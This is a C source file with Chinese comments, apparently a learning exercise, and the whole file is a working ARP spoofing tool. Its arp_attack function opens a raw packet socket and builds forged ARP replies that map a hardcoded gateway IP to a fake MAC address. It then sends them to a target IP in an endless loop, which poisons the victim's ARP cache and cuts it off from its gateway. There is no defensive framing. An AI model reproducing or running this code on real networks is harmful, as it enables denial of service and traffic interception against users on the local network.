/**
 * @file arp_request.c
 */
//基本C语言库，基本输入输出，字符串库
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

//系统调用库
#include <unistd.h>
//IO操作库，ioctl()
#include <sys/ioctl.h>
//套接字库
#include <sys/socket.h>
//套接地址库, sockaddr_in, sockaddr_ll
#include <arpa/inet.h>

//用到的各种网络数据包库 
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <net/if_arp.h>
#include <net/if.h>
#include <netpacket/packet.h>

/* 以太网帧首部长度 */
#define ETHER_HEADER_LEN sizeof(struct ether_header)
/* 整个arp结构长度 */
#define ETHER_ARP_LEN sizeof(struct ether_arp)
/* 以太网 + 整个arp结构长度 */
#define ETHER_ARP_PACKET_LEN ETHER_HEADER_LEN + ETHER_ARP_LEN
/* IP地址长度 */
#define IP_ADDR_LEN 4
/* 广播地址 */
#define BROADCAST_ADDR {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}
/* fake mac addresss*/
#define FAKE_GATEWAY_MAC {0x12, 0x34, 0x56, 0x12, 0x34, 0x56}

void err_exit(const char *err_msg)
{
    perror(err_msg);
    exit(1);
}

/* 填充arp响应包 */
struct ether_arp *fill_arp_packet_attack(const unsigned char *src_mac_addr, const char *src_ip, const char *dst_ip, const unsigned char *dst_mac_addr)
{
    struct ether_arp *arp_packet;
    struct in_addr src_in_addr, dst_in_addr;

    /* IP地址转换 */
    inet_pton(AF_INET, src_ip, &src_in_addr);
    inet_pton(AF_INET, dst_ip, &dst_in_addr);

    /* 整个arp包 */
    arp_packet = (struct ether_arp *)malloc(ETHER_ARP_LEN);
    arp_packet->arp_hrd = htons(ARPHRD_ETHER);
    arp_packet->arp_pro = htons(ETHERTYPE_IP);
    arp_packet->arp_hln = ETH_ALEN;
    arp_packet->arp_pln = IP_ADDR_LEN;
    arp_packet->arp_op = htons(ARPOP_REPLY);
    memcpy(arp_packet->arp_sha, src_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_tha, dst_mac_addr, ETH_ALEN);
    memcpy(arp_packet->arp_spa, &src_in_addr, IP_ADDR_LEN);
    memcpy(arp_packet->arp_tpa, &dst_in_addr, IP_ADDR_LEN);

    return arp_packet;
}

// arp 攻击
void arp_attack(const char *if_name, const char *dst_ip)
{
    struct sockaddr_ll saddr_ll;
    struct ether_header *eth_header;
    struct ether_arp *arp_packet;
    struct ifreq ifr;
    char buf[ETHER_ARP_PACKET_LEN];
    unsigned char src_mac_addr[ETH_ALEN];
    unsigned char dst_mac_addr[ETH_ALEN] = BROADCAST_ADDR;
    char *src_ip;
    char* gateway_ip;
    int sock_raw_fd, ret_len, i;

    if ((sock_raw_fd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1)
        err_exit("socket()");

    bzero(&saddr_ll, sizeof(struct sockaddr_ll));
    bzero(&ifr, sizeof(struct ifreq));
    /* 网卡接口名 */
    memcpy(ifr.ifr_name, if_name, strlen(if_name));

    /* 获取网卡接口索引 */
    if (ioctl(sock_raw_fd, SIOCGIFINDEX, &ifr) == -1)
        err_exit("ioctl() get ifindex");
    saddr_ll.sll_ifindex = ifr.ifr_ifindex;
    saddr_ll.sll_family = PF_PACKET;

    /* 获取网卡接口IP */
    if (ioctl(sock_raw_fd, SIOCGIFADDR, &ifr) == -1)
        err_exit("ioctl() get ip");
    src_ip = inet_ntoa(((struct sockaddr_in *)&(ifr.ifr_addr))->sin_addr);
    printf("local ip:%s\n", src_ip);

    /* 获取网卡接口MAC地址 */
    if (ioctl(sock_raw_fd, SIOCGIFHWADDR, &ifr))
        err_exit("ioctl() get mac");
    memcpy(src_mac_addr, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
    printf("local mac");
    for (i = 0; i < ETH_ALEN; i++)
        printf(":%02x", src_mac_addr[i]);
    printf("\n");

    // 设置网关ip
    gateway_ip = "192.168.19.2";
    // 源mac地址随意赋值
    unsigned char mac_addr[ETH_ALEN] = FAKE_GATEWAY_MAC;
    /*for (i = 0; i < ETH_ALEN; i++)
    {
        mac_addr[i] = 0xbb;
    }*/
    bzero(buf, ETHER_ARP_PACKET_LEN);
    /* 填充以太首部 */
    eth_header = (struct ether_header *)buf;
    memcpy(eth_header->ether_shost, src_mac_addr, ETH_ALEN);
    memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
    eth_header->ether_type = htons(ETHERTYPE_ARP);
    /* arp包 */
    arp_packet = fill_arp_packet_attack(mac_addr, gateway_ip, dst_ip, dst_mac_addr);
    memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);
    
    /* 进行攻击 */
    while(1)
    {
        ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr *)&saddr_ll, sizeof(struct sockaddr_ll));
        if ( ret_len > 0)
        {
            printf("sendto() ok!!!\n");
        }
    }
    close(sock_raw_fd);
}

int main(int argc, const char *argv[])
{
    if (argc != 3)
    {
        printf("usage:%s device_name dst_ip\n", argv[0]);
        exit(1);
    }
    arp_attack(argv[1], argv[2]);
    return 0;
}
